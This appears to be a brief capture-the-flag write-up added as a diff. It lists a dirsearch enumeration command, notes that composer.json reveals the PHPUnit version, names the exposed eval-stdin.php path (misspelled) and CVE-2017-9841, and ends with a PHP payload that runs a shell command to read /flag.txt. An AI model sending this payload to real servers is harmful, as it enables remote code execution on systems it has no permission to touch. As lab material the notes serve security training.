@@ -1,0 +1,9 @@
+dirsearch -u {u} -w db/dicc.txt
+/composer.json 
+Here we can find version of php-unit
+/eval-stding.php
+Vulnerable path
+
+CVE-2017-9841
+
+<?php system('cat /flag.txt')?>
